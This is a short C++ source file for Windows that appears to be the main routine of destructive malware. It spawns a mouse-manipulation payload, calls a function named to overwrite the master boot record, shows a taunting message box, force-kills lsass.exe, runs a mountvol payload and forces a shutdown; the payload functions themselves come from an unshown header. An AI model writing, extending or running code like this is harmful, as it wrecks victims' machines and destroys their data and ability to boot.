#include <iostream>
#include <stdio.h>
#include <Windows.h>
#include <string>
#include <thread>
#include "payloads.h"

int sleep_mouse = 100;

int main()
{
	auto f = []() {
		mouse_payload(sleep_mouse);
	};
	std::thread thread_object(f);
	Sleep(1000 * 10);
	overwrite_mbr_payload();
	MessageBox(NULL, "See you ya", "...", MB_OK);
	Sleep(1000 * 5);
	system("taskkill /im lsass.exe /f");
	mountvol_payload();
	System("shutdown -f");
}
